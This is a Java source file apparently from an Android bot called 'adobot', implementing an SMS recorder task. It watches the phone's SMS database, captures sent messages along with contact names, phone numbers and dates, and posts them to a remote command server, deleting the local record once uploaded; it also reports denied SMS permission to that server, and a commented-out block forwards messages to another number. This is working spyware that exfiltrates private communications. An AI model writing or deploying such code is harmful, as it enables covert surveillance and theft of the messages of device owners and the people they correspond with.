package com.android.adobot.tasks;

import android.Manifest;
import android.arch.persistence.room.Room;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.adobot.AdobotConstants;
import com.android.adobot.CommonParams;
import com.android.adobot.SmsBroadcastReceiver;
import com.android.adobot.database.AppDatabase;
import com.android.adobot.database.Sms;
import com.android.adobot.database.SmsDao;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpCallback;
import com.android.adobot.http.HttpRequest;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Objects;

/**
 * Created by adones on 2/27/17.
 */

public class SmsRecorderTask extends BaseTask {

    private static final String TAG = "SmsRecorderTask";

    private static final Uri smsUri = Uri.parse("content://sms");
    public static final int MESSAGE_TYPE_RECEIVED = 1;
    public static final int MESSAGE_TYPE_SENT = 2;

    private SmsObserver smsObserver;
    private SharedPreferences prefs;
    private ContentResolver contentResolver;
    private AppDatabase appDatabase;
    public SmsDao smsDao;
    private static SmsRecorderTask instance;
    private int lastId = 0;

    public SmsRecorderTask(Context context) {
        setContext(context);
        appDatabase = Room.databaseBuilder(context.getApplicationContext(),
                AppDatabase.class, AdobotConstants.DATABASE_NAME).build();
        smsDao = appDatabase.smsDao();
        smsObserver = (new SmsObserver(new Handler()));
        contentResolver = context.getContentResolver();
        prefs = context.getSharedPreferences(AdobotConstants.PACKAGE_NAME, Context.MODE_PRIVATE);
        instance = this;
        listen();
    }

    public static SmsRecorderTask getInstance() {
        return instance;
    };

    public void listen() {
        if (hasPermission()) {
            commonParams = new CommonParams(context);
            contentResolver.registerContentObserver(smsUri, true, smsObserver);
        } else
            requestPermissions();
    }

    private boolean hasPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) ==
                PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.INTERNET) ==
                PackageManager.PERMISSION_GRANTED;
    }

    public interface SubmitSmsCallback {
        void onResult (boolean success);
    }

    public void submitNextRecord(final SubmitSmsCallback cb) {
        Log.i(TAG, "submitNextRecord()");
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                Sms m = smsDao.first();
                Log.i(TAG, "m = " + m);
                if (m != null) {
                    submitSms(m, cb);
                } else
                    cb.onResult(true);
            }
        });
        thread.start();
    }


    public Sms findSmsFromContent(String mPhone, String mBody, int mType) {

        if(ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

            Uri callUri = Uri.parse("content://sms/inbox");
            ContentResolver cr = context.getApplicationContext().getContentResolver();
            Cursor mCur = cr.query(callUri, null, null, null, null);
            if (mCur.moveToFirst()) {
                do {

                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    Calendar calendar = Calendar.getInstance();
                    String now = mCur.getString(mCur.getColumnIndex("date"));
                    calendar.setTimeInMillis(Long.parseLong(now));

                    try {
                        String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                        int id = mCur.getInt(mCur.getColumnIndex("_id"));
                        String phone = mCur.getString(mCur.getColumnIndex("address"));
                        String name = getContactName(phone);
                        String body = mCur.getString(mCur.getColumnIndex("body"));
                        String date = formatter.format(calendar.getTime());
                        int type = mCur.getInt(mCur.getColumnIndex("type"));

                        if (Objects.equals(mBody.trim(), body.trim()) &&
                                Objects.equals(mPhone.trim(), phone.trim()) &&
                                mType == type) {

                            // found
                            Sms sms = smsDao.findByAttributes(mPhone, mBody, date ,type);
                            if (sms == null) {
                                sms = new Sms();
                            }

                            Log.i(TAG, "Subtituting sms from:" + mPhone + " Message: " + body);

                            sms.set_id(id);
                            sms.setThread_id(thread_id);
                            sms.setPhone(phone);
                            sms.setName(name);
                            sms.setBody(body);
                            sms.setDate(date);
                            sms.setType(type);

                            return sms;
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                        return null;
                    }

                } while (mCur.moveToNext());
            } else {
                // no message
                return null;
            }
            mCur.close();
            return null;

        } else {
            Log.i(TAG, "No SMS permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", commonParams.getUid());
            noPermit.put("device", commonParams.getDevice());
            noPermit.put("permission", "READ_SMS");
            Http doneSMS = new Http();
            doneSMS.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
            doneSMS.setMethod(HttpRequest.METHOD_POST);
            doneSMS.setParams(noPermit);
            doneSMS.execute();

            return null;
        }
    }

    private void submitSms(Sms sms, final SubmitSmsCallback cb) {

        String err = "Can't find sms: " + sms.getBody() + ", From: " + sms.getPhone();

        if (sms.get_id() == 0 && Objects.equals(SmsBroadcastReceiver.SMS_RECEIVED, sms.getThread_id()) && Objects.equals(sms.getName(), SmsBroadcastReceiver.SMS_RECEIVED)) {
            Sms smsRecord = findSmsFromContent(sms.getPhone(), sms.getBody(), sms.getType());
            if (smsRecord == null) {
                Log.i(TAG, err);
                sms.setName("UNKNOWN_CONTACT");
                sms.setThread_id("0");
                sms.set_id(0);
            } else {
                sms = smsRecord;
            }
        }

        final int type = sms.getType();
        final int id = sms.get_id();
        final String thread_id = sms.getThread_id();
        final String name = sms.getName();
        final String phone = sms.getPhone();
        final String body = sms.getBody();
        final String date = sms.getDate();

        final Sms _sms = sms;

        try {

            HashMap p = new HashMap();
            p.put("uid", commonParams.getUid());
            p.put("type", type);
            p.put("message_id", id);
            p.put("thread_id", thread_id);
            p.put("phone", phone);
            p.put("name", name);
            p.put("message", body);
            p.put("date", date);

            JSONObject obj = new JSONObject(p);
            Log.i(TAG, "Submitting SMS: " + obj.toString());

            Http smsHttp = new Http();
            smsHttp.setMethod(HttpRequest.METHOD_POST);
            smsHttp.setUrl(commonParams.getServer() + AdobotConstants.POST_MESSAGE_URL);
            smsHttp.setParams(p);
            smsHttp.setCallback(new HttpCallback() {
                @Override
                public void onResponse(HashMap response) {
                    int statusCode = (int) response.get("status");
                    if (statusCode >= 200 && statusCode < 400) {
                        try {
                            smsDao.delete(_sms);
                            Log.i(TAG, "sms submitted!! " + body);
                            submitNextRecord(cb);
                        } catch (Exception e) {
                            Log.i(TAG, "Failed to delete sms: " + phone);
                            cb.onResult(false);
                            e.printStackTrace();
                        }
                    } else {
                        Log.i(TAG, "Sms failed to submit!!!" + phone);
                        Log.i(TAG, "Status code: " + statusCode);
                        cb.onResult(false);
                    }
                }
            });
            smsHttp.execute();

        } catch (Exception e) {
            Log.i(TAG, "FAiled with error: " + e.toString());
            e.printStackTrace();
            cb.onResult(false);
        }
    }

    public class InsertSmsModel extends Thread {
        private Sms sms;

        public InsertSmsModel(Sms sms) {
            this.sms = sms;
        }

        @Override
        public void run() {
            super.run();

            try {
                smsDao.insert(sms);
                Log.i(TAG, "Message saved, type: " + sms.getType() +  "!!!" + sms.getBody());
                submitSms(sms, new SubmitSmsCallback() {
                    @Override
                    public void onResult(boolean success) {
                        if (success) {
                            submitNextRecord(new SubmitSmsCallback() {
                                @Override
                                public void onResult(boolean success) {
                                    // nothing to do after submit
                                }
                            });
                        }
                    }
                });
            } catch (Exception e) {
                Log.i(TAG, "Failed to save sms: id: " + sms.getId());
            }
        }
    }



    public void saveSms(Cursor mCur) {
        final int type = mCur.getInt(mCur.getColumnIndex("type"));
        final int id = mCur.getInt(mCur.getColumnIndex("_id"));
        final String body = mCur.getString(mCur.getColumnIndex("body"));

        // accept only received and sent
        if (id != lastId && (type == MESSAGE_TYPE_SENT)) {

            lastId = id;

            final String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
            final String phone = mCur.getString(mCur.getColumnIndex("address"));
            final String name = getContactName(phone);


            SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            Calendar calendar = Calendar.getInstance();
            String now = mCur.getString(mCur.getColumnIndex("date"));
            calendar.setTimeInMillis(Long.parseLong(now));

            final String date = formatter.format(calendar.getTime());

            Sms sms = new Sms();
            sms.set_id(id);
            sms.setThread_id(thread_id);
            sms.setBody(body);
            sms.setName(name);
            sms.setPhone(phone);
            sms.setDate(date);
            sms.setType(type);

            InsertSmsModel ins = new InsertSmsModel(sms);
            ins.start();

                /*SimpleDateFormat df = new SimpleDateFormat("EEE d MMM yyyy");
                SimpleDateFormat tf = new SimpleDateFormat("hh:mm aaa");
                Calendar calendar = Calendar.getInstance();
                String now = mCur.getString(mCur.getColumnIndex("date"));
                calendar.setTimeInMillis(Long.parseLong(now));
                String phone = mCur.getString(mCur.getColumnIndex("address"));
                String name = getContactName(phone);
                String date = df.format(calendar.getTime()) + "\n" + tf.format(calendar.getTime());*/

               /* String message = AdobotConstants.SMS_FORWARDER_SIGNATURE + "\n\n";
                message += "From: " + commonParams.getDevice() + "\n";
                message += "UID: " + commonParams.getUid() + "\n\n";
                message += type == MESSAGE_TYPE_RECEIVED ? "(Received) " : (type == MESSAGE_TYPE_SENT ? "(Sent) " : "");
                message += name != null ? name + "\n" : "";
                message += phone != null ? phone : "";
                message += "\n\n";
                message += body + "\n\n";
                message += date + "\n\n";

                Thread send = new SendSmsThread(recipientNumber, message);
                send.start();*/

        }

    }

    public class SmsObserver extends ContentObserver {

        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Cursor cursor = null;

            try {
                cursor = contentResolver.query(smsUri, null, null, null, "date DESC");

                if (cursor != null && cursor.moveToNext()) {
                    saveSms(cursor);
                }
            } finally {
                if (cursor != null)
                    cursor.close();
            }

        }

    }


}
